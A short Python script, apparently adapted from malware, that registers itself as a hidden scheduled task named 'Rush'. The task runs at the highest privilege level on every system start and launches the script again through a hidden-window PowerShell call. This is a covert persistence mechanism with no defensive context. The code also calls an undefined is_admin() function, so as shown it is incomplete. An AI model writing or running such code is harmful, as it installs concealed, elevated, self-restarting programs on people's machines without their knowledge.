# adapted by me

import os
import shutil

def add_to_startup():
    try:
        if is_admin():
            task_name = "Rush"
            os.system(
                f"schtasks /create /f /rl highest /sc onstart /tn {task_name} /tr \"'cmd.exe' /c powershell Start-Process -WindowStyle Hidden {__file__}\""
            )
            os.system("cls")
            print("Added to startup!")
        else:
            print("You need to be an admin to do this!")
    except Exception as e:
        print("An error occurred while adding to startup:")
        print(str(e))

add_to_startup()
